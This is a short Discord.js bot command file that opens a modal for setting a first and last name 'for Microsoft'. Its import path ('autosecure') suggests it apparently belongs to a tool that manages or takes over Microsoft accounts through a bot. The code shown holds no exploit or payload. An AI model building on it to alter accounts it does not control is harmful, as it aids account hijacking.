const { TextInputStyle } = require("discord.js");
const generate = require("../../utils/generate");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");

module.exports = {
    name: "changename",
    description: "Opens a modal to change first and last name",
    callback: async (client, interaction) => {
        const parts = interaction.customId.split('|');
        const isSecure = parts[1] === "true";
        const hasAction = parts.length > 2;

        let customModalId;

        if (hasAction) {
            const actionId = generate(32);
            try {
                await client.queryParams(
                    `INSERT INTO actions (id, action) VALUES (?, ?)`,
                    [actionId, `changename|${parts[1]}|${parts[2]}`]
                );
            } catch (err) {
                // error handling omitted
            }
            customModalId = `action|${actionId}`;
        } else {
            customModalId = isSecure ? `changename|true` : `changename`;
        }

        interaction.showModal(modalBuilder(
            customModalId,
            `Change First and Last Name (leave empty)`,
            [
                {
                    setCustomId: 'firstname',
                    setRequired: false,
                    setLabel: 'First Name',
                    setPlaceholder: 'Enter first name for Microsoft to be set.',
                    setMaxLength: 32,
                    setStyle: TextInputStyle.Short
                },
                {
                    setCustomId: 'lastname',
                    setRequired: false,
                    setLabel: 'Last Name',
                    setPlaceholder: 'Enter last name for Microsoft to be set.',
                    setMaxLength: 32,
                    setStyle: TextInputStyle.Short
                }
            ]
        ));
    }
};
